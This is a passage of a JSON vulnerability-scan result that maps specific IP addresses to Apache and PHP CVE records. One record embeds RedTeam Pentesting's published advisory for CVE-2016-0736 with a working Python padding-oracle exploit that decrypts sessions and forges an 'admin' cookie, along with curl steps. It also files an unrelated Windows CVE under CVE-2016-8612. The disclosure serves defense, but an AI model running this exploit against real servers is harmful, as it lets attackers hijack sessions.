                "source": "CVE",
                "_id": "2016-4975",
                "description": "Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the \"Location\" or other outbound header key or value. Fixed in Apache HTTP Server 2.4.25 (Affected 2.4.1-2.4.23). Fixed in Apache HTTP Server 2.2.32 (Affected 2.2.0-2.2.31).",
                "osvdb": [],
                "bid": [
                    105093
                ],
                "cve": [
                    "CVE-2016-4975"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ],
        "CVE-2018-19520": [
            {
                "source": "CVE",
                "_id": "2018-19520",
                "description": "An issue was discovered in SDCMS 1.6 with PHP 5.x. app/admin/controller/themecontroller.php uses a check_bad function in an attempt to block certain PHP functions such as eval, but does not prevent use of preg_replace 'e' calls, allowing users to execute arbitrary code by leveraging access to admin template management.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-19520"
                ],
                "msb": []
            }
        ],
        "CVE-2018-19396": [
            {
                "source": "CVE",
                "_id": "2018-19396",
                "description": "ext/standard/var_unserializer.c in PHP 5.x through 7.1.24 allows attackers to cause a denial of service (application crash) via an unserialize call for the com, dotnet, or variant class.",
                "osvdb": [],
                "bid": [
                    105989
                ],
                "cve": [
                    "CVE-2018-19396"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.20": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.23": {},
    "152.1.8.64": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0118": [
            {
                "source": "CVE",
                "_id": "2014-0118",
                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
                "osvdb": [],
                "bid": [
                    68745
                ],
                "cve": [
                    "CVE-2014-0118"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.65": {},
    "152.1.8.67": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.68": {},
    "152.1.8.88": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0118": [
            {
                "source": "CVE",
                "_id": "2014-0118",
                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
                "osvdb": [],
                "bid": [
                    68745
                ],
                "cve": [
                    "CVE-2014-0118"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0736": [
            {
                "source": "CVE",
                "_id": "2016-0736",
                "description": "In Apache HTTP Server versions 2.4.0 to 2.4.23, mod_session_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.",
                "osvdb": [],
                "bid": [
                    95078
                ],
                "cve": [
                    "CVE-2016-0736"
                ],
                "msb": []
            },
            {
                "code": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
                "description": "Apache mod_session_crypto - Padding Oracle",
                "author": "RedTeam Pentesting GmbH",
                "_id": 40961,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-12-23T00:00:00+00:00",
                "cve": [
                    "CVE-2016-0736"
                ],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2015-3185": [
            {
                "source": "CVE",
                "_id": "2015-3185",
                "description": "The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",
                "osvdb": [],
                "bid": [
                    75965
                ],
                "cve": [
                    "CVE-2015-3185"
                ],
                "msb": []
            }
        ],
        "CVE-2015-3184": [
            {
                "source": "CVE",
                "_id": "2015-3184",
                "description": "mod_authz_svn in Apache Subversion 1.7.x before 1.7.21 and 1.8.x before 1.8.14, when using Apache httpd 2.4.x, does not properly restrict anonymous access, which allows remote anonymous users to read hidden files via the path name.",
                "osvdb": [],
                "bid": [
                    76274
                ],
                "cve": [
                    "CVE-2015-3184"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ],
        "CVE-2016-4975": [
            {
                "source": "CVE",
                "_id": "2016-4975",
                "description": "Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the \"Location\" or other outbound header key or value. Fixed in Apache HTTP Server 2.4.25 (Affected 2.4.1-2.4.23). Fixed in Apache HTTP Server 2.2.32 (Affected 2.2.0-2.2.31).",
                "osvdb": [],
                "bid": [
                    105093
                ],
                "cve": [
                    "CVE-2016-4975"
                ],
                "msb": []
            }
        ],
        "CVE-2016-8612": [
            {
                "source": "CVE",
                "_id": "2016-8612",
                "description": "Apache HTTP Server mod_cluster before version httpd 2.4.23 is vulnerable to an Improper Input Validation in the protocol parsing logic in the load balancer resulting in a Segmentation Fault in the serving httpd process.",
                "osvdb": [],
                "bid": [
                    94939
                ],
                "cve": [
                    "CVE-2016-8612"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-8612",
                "description": "A Denial Of Service vulnerability exists when Connected User Experiences and Telemetry Service fails to validate certain function values, aka \"Connected User Experiences and Telemetry Service Denial of Service Vulnerability.\" This affects Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.",
                "osvdb": [],
                "bid": [
                    106087
                ],
                "cve": [
                    "CVE-2018-8612"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0226": [
            {
                "source": "CVE",
                "_id": "2014-0226",
                "description": "Race condition in the mod_status module in the Apache HTTP Server before 2.4.10 allows remote attackers to cause a denial of service (heap-based buffer overflow), or possibly obtain sensitive credential information or execute arbitrary code, via a crafted request that triggers improper scoreboard handling within the status_handler function in modules/generators/mod_status.c and the lua_ap_scoreboard_worker function in modules/lua/lua_request.c.",
                "osvdb": [
                    109216
                ],
                "bid": [
                    68678
                ],
                "cve": [
                    "CVE-2014-0226"
                ],
                "msb": []
            }
        ],
        "CVE-2014-3523": [
            {
                "source": "CVE",
                "_id": "2014-3523",
                "description": "Memory leak in the winnt_accept function in server/mpm/winnt/child.c in the WinNT MPM in the Apache HTTP Server 2.4.x before 2.4.10 on Windows, when the default AcceptFilter is enabled, allows remote attackers to cause a denial of service (memory consumption) via crafted requests.",
                "osvdb": [],
                "bid": [
                    68747
                ],
                "cve": [
                    "CVE-2014-3523"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.89": {},
    "152.1.8.99": {},
    "152.1.8.103": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.104": {},
    "152.1.8.106": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.107": {},
    "152.1.8.108": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.111": {},
    "152.1.8.112": {},
    "152.1.8.133": {
        "CVE-2018-10549": [
            {
                "source": "CVE",
                "_id": "2018-10549",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. exif_read_data in ext/exif/exif.c has an out-of-bounds read for crafted JPEG data because exif_iif_add_value mishandles the case of a MakerNote that lacks a final '\\0' character.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10549"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10548": [
            {
                "source": "CVE",
                "_id": "2018-10548",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. ext/ldap/ldap.c allows remote LDAP servers to cause a denial of service (NULL pointer dereference and application crash) because of mishandling of the ldap_get_dn return value.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10548"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10545": [
            {
                "source": "CVE",
                "_id": "2018-10545",
                "description": "An issue was discovered in PHP before 5.6.35, 7.0.x before 7.0.29, 7.1.x before 7.1.16, and 7.2.x before 7.2.4. Dumpable FPM child processes allow bypassing opcache access controls because fpm_unix.c makes a PR_SET_DUMPABLE prctl call, allowing one user (in a multiuser environment) to obtain sensitive information from the process memory of a second user's PHP applications by running gcore on the PID of the PHP-FPM worker process.",
                "osvdb": [],
                "bid": [
                    104022
                ],
                "cve": [
                    "CVE-2018-10545"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10547": [
            {
                "source": "CVE",
                "_id": "2018-10547",
                "description": "An issue was discovered in ext/phar/phar_object.c in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. There is Reflected XSS on the PHAR 403 and 404 error pages via request data of a request for a .phar file. NOTE: this vulnerability exists because of an incomplete fix for CVE-2018-5712.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-10547"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10546": [
            {
                "source": "CVE",
                "_id": "2018-10546",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. An infinite loop exists in ext/iconv/iconv.c because the iconv stream filter does not reject invalid multibyte sequences.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10546"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.145": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.146": {},
    "152.1.8.147": {},
    "152.1.8.148": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.151": {},
    "152.1.8.152": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.153": {},
    "152.1.8.154": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.155": {},
    "152.1.8.156": {},
    "152.1.8.157": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0118": [
            {
                "source": "CVE",
                "_id": "2014-0118",
                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
                "osvdb": [],
                "bid": [
                    68745
                ],
                "cve": [
                    "CVE-2014-0118"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0736": [
            {
                "source": "CVE",
                "_id": "2016-0736",
                "description": "In Apache HTTP Server versions 2.4.0 to 2.4.23, mod_session_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.",
                "osvdb": [],
                "bid": [
                    95078
                ],
                "cve": [
                    "CVE-2016-0736"
                ],
                "msb": []
            },
            {
